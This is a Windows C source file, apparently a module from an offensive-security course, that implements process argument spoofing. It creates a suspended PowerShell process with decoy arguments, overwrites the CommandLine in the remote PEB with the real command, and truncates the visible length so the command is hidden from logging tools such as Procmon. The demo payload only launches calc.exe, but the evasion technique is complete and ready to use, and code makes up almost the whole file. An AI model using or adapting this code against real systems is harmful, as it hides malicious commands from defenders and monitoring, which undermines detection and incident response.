#include <stdio.h>
#include <Windows.h>
#include <winternl.h>

// disable error 4996 (caused by sprint)
#pragma warning (disable:4996)


#define STARTUP_ARGUMENTS			L"powershell.exe Not An Evil Argument"
#define REAL_ARGUMENTS				L"powershell.exe -NoExit calc.exe"
#define SIZE_EXPOSED_FROM_PAYLOAD	sizeof(L"powershell.exe")


typedef NTSTATUS(NTAPI* fnNtQueryInformationProcess) (
	HANDLE           ProcessHandle,
	PROCESSINFOCLASS ProcessInformationClass,
	PVOID            ProcessInformation,
	ULONG            ProcessInformationLength,
	PULONG           ReturnLength
);


/*
* Process argument spoofing is a technique used to conceal the command line argument of a newly spawned process.
* This allows execution of commands without revealing them to logging services i.e. Procmon.
* In this module, we'll try to execute `powershell.exe -c calc` without it being logged to Procmon.
*/

/*
* The arguments are stored within the process's PEB structure.
* Specifically, in the RTL_USER_PROCESS_PARAMETERS structure > `CommandLine` member inside the PEB.
*/
/*
* typedef struct _RTL_USER_PROCESS_PARAMETERS {
  BYTE           Reserved1[16];
  PVOID          Reserved2[10];
  UNICODE_STRING ImagePathName;
  UNICODE_STRING CommandLine;
* } RTL_USER_PROCESS_PARAMETERS, *PRTL_USER_PROCESS_PARAMETERS;
*/

/*
* `CommandLine` is a UNICODE_STRING.
*/
/*
* typedef struct _UNICODE_STRING {
  USHORT Length;
  USHORT MaximumLength;
  PWSTR  Buffer;
* } UNICODE_STRING, *PUNICODE_STRING;
*/

/*
* To perform spoofing:
*	1) Create a target process in a suspended state, passing non-suspicious dummy arguments.
*	2) Get the remote PEB address of the created process.
*	3) Read the remote PEB structure from the created process.
*	4) Read the remote `PEB -> ProcessParameters` structure.
*	5) Patch the string `ProcessParameters.CommandLine.Buffer` with the payload.
*	6) Resume the process.
*/

/*
* The `ReadFromTargetProcess` helper function will return an allocated heap that contains the buffer read from the target process.
* First it will read the PEB structure then use it to retrieve the RTL_USER_PROCESS_PARAMETERS structure.
*/
BOOL ReadFromTargetProcess(IN HANDLE hProcess, IN PVOID pAddress, OUT PVOID* ppReadBuffer, IN DWORD dwBufferSize) {

	SIZE_T sNumberOfBytesRead = NULL;

	*ppReadBuffer = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dwBufferSize);

	if (!ReadProcessMemory(hProcess, pAddress, *ppReadBuffer, dwBufferSize, &sNumberOfBytesRead) || sNumberOfBytesRead != dwBufferSize) {
		printf("[!] ReadProcessMemory failed with error: %d\n", GetLastError());
		printf("[i] Bytes read: %d of %d\n", sNumberOfBytesRead, dwBufferSize);
		return FALSE;
	}

return TRUE;

}

/*
* The `WriteToTargetProcess` helper function will pass the appropriate parameters to `WriteProcessMemory` and check the output.
*/
BOOL WriteToTargetProcess(IN HANDLE hProcess, IN PVOID pAddressToWriteTo, IN PVOID pBuffer, IN DWORD dwBufferSize) {

	SIZE_T sNumberOfBytesWritten = NULL;

	if (!WriteProcessMemory(hProcess, pAddressToWriteTo, pBuffer, dwBufferSize, &sNumberOfBytesWritten) || sNumberOfBytesWritten != dwBufferSize) {
		printf("[!] WriteProcessMemory failed with error: %d\n", GetLastError());
		printf("[i] Bytes written: %d of %d\n", sNumberOfBytesWritten, dwBufferSize);
		return FALSE;
	}

	return TRUE;

}

/*
* `CreateArgSpoofedProcess` performs argument spoofing on a newly-created process.
*		`szStartupArgs`		-	The dummy arguments. These should be benign.
*		`szRealArgs`		-	The real arguments to execute.
*		`dwProcessId`		-	A pointer to a DWORD that recieves the PID.
*		`hProcess`			-	A pointer to a HANDLE that receives the process handle.
*		`hThread`			-	A pointer to a DWORD that receives the process's thread handle.
*/
BOOL CreateArgSpoofedProcess(IN LPWSTR szStartupArgs, IN LPWSTR szRealArgs,
	OUT DWORD* dwProcessId, OUT HANDLE* hProcess, OUT HANDLE* hThread) {

	NTSTATUS						STATUS = NULL;

	WCHAR							szProcess[MAX_PATH];

	STARTUPINFOW					Si = { 0 };
	PROCESS_INFORMATION				Pi = { 0 };

	PROCESS_BASIC_INFORMATION		PBI = { 0 };
	ULONG							uRetern = NULL;

	PPEB							pPeb = NULL;
	PRTL_USER_PROCESS_PARAMETERS	pParms = NULL;

	RtlSecureZeroMemory(&Si, sizeof(STARTUPINFOW));
	RtlSecureZeroMemory(&Pi, sizeof(PROCESS_INFORMATION));

	Si.cb = sizeof(STARTUPINFOW);

	// Get the address of the NtQueryInformationProcess function
	fnNtQueryInformationProcess pNtQueryInformationProcess = (fnNtQueryInformationProcess)GetProcAddress(GetModuleHandleW(L"NTDLL"), "NtQueryInformationProcess");
	if (pNtQueryInformationProcess == NULL)
		return FALSE;

	// Copy `szStartupArgs` into `szProcess`
	lstrcpyW(szProcess, szStartupArgs);

	wprintf(L"\t[i] Running: \"%s\"...", szProcess);

	if (!CreateProcessW(
		NULL,
		szProcess,
		NULL,
		NULL,
		FALSE,
		CREATE_SUSPENDED | CREATE_NO_WINDOW,		// create the process suspended and with no window
		NULL,
		L"C:\\Windows\\System32",					// we can use GetEnvironmentVariableW to get this programmatically
		&Si,
		&Pi
	)) {
		wprintf(L"\t[!] CreateProcessA failed with error: %d\n", GetLastError());
		return FALSE;
	}

	wprintf(L"[+] DONE!\n");
	wprintf(L"\t[i] Target process created with PID: %d\n", Pi.dwProcessId);

	// Get the `PROCESS_BASIC_INFORMATION` structure of the rmote process (that contains the PEB address)
	if ((STATUS = pNtQueryInformationProcess(Pi.hProcess, ProcessBasicInformation, &PBI, sizeof(PROCESS_BASIC_INFORMATION), &uRetern)) != 0) {
		wprintf(L"\t[!] NtQueryInformationProcess failed with error: 0x%0.8x \n", STATUS);
		return FALSE;
	}

	// Read the PEB structure from its base address in the remote process
	if (!ReadFromTargetProcess(Pi.hProcess, PBI.PebBaseAddress, &pPeb, sizeof(PEB))) {
		wprintf(L"\t[!] Failed to read target process's PEB\n");
		return FALSE;
	}

	// Read the `ProcessParameters` structure from the PEB of the remote process
	// We read an extra `0xFF` bytes to ensure we have reached the `CommandLine.Buffer` pointer
	if (!ReadFromTargetProcess(Pi.hProcess, pPeb->ProcessParameters, &pParms, sizeof(RTL_USER_PROCESS_PARAMETERS) + 0xFF)) {
		wprintf(L"\t[!] Failed to read target process's ProcessParameters\n");
		return FALSE;
	}

	// Write the parameter we want to run
	// The `nSize` parameter is the size of the buffer in bytes. It is equal to the length of the string times the size of WCHAR plus 1 (for the null character)
	wprintf(L"\t[i] Writing \"%s\" as the process argument at: 0x%p...", szRealArgs, pParms->CommandLine.Buffer);
	if (!WriteToTargetProcess(Pi.hProcess, (PVOID)pParms->CommandLine.Buffer, (PVOID)szRealArgs, (DWORD)(lstrlenW(szRealArgs) * sizeof(WCHAR) + 1))) {
		wprintf(L"\t[!] Failed To Write The Real Parameters\n");
		return FALSE;
	}
	wprintf(L"[+] DONE!\n");

	// Runtime spoofing: to cutoff from "powershell.exe -NoExit calc.exe ument" to "powershell.exe"
	DWORD dwNewLen = SIZE_EXPOSED_FROM_PAYLOAD;
	wprintf(L"\n\t[i] Updating the length of the process argument from %d to %d...", pParms->CommandLine.Length, dwNewLen);
	if (!WriteToTargetProcess(Pi.hProcess, ((PBYTE)pPeb->ProcessParameters + offsetof(RTL_USER_PROCESS_PARAMETERS, CommandLine.Length)), (PVOID)&dwNewLen, sizeof(DWORD))) {
		wprintf(L"\t[!] Failed to write the real parameters\n");
		return FALSE;
	}
	wprintf(L"[+] DONE!\n");

	// Clean up
	HeapFree(GetProcessHeap(), NULL, pPeb);
	HeapFree(GetProcessHeap(), NULL, pParms);

	// Resume the process with the new parameters
	ResumeThread(Pi.hThread);

	// Save output parameters
	*dwProcessId = Pi.dwProcessId;
	*hProcess = Pi.hProcess;
	*hThread = Pi.hThread;

	return (*dwProcessId != NULL && *hProcess != NULL && *hThread != NULL);

}

int main() {

	HANDLE		hProcess			= NULL,
				hThread				= NULL;
	DWORD		dwProcessId			= NULL;

	wprintf(L"[i] Target process will be created with [Startup Arguments] \"%s\"\n", STARTUP_ARGUMENTS);
	wprintf(L"[i] The actual arguments [Payload Argument] \"%s\"\n", REAL_ARGUMENTS);

	if (!CreateArgSpoofedProcess(STARTUP_ARGUMENTS, REAL_ARGUMENTS, &dwProcessId, &hProcess, &hThread))
		return -1;

	wprintf(L"\n[#] Press <Enter> to quit...");
	getchar();
	
	CloseHandle(hProcess);
	CloseHandle(hThread);

	return 0;

}